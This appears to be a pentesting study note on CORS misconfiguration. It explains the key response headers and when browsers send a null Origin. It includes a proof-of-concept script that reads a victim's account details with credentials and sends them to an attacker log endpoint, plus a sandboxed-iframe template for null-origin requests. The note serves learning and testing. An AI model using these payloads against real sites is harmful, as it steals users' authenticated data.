# Cross-Origin Resource Sharing
A browser mechanishm that enables controlled access to resources located outside of a domain. 

When it is badly implemented, it might cause vulnerabilities. 

There are some policies that manage what resources are allowed. These are the most important response headers that can enable special policies:
- [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin): * | \<origin> | null. This checks the [Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) request header
- [Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials): true
- [Cross-Origin-Resource-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy): same-site | same-origin | cross-origin

Browsers send the `Origin` header in situations. Sometimes it sends `Origin: null` in these situations:
- Cross-Origin redirects
- Requests from serialized data
- Request using the `file:` protocol
- Sandboxed cross-origin requests [PoC](#sandboxed-iframe)
If implemented incorrectly, this might allow the null origin to be trusted, thus making it vulnerable.

### XSS
If server trusts another server, but the second server is vulnerable to [xss](./xss.md), an attacker can inject a cors payload through xss. This allows them to retrieve sensitive data.

## Proof of Concepts

### Basic | CORS
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/accountDetails',true);
    req.withCredentials = true;
    req.send();

    /* Send a requests to /log, to let the attacker read the response */
    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

### Sandboxed iFrame
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    /* javascript here */
</script>"></iframe>
```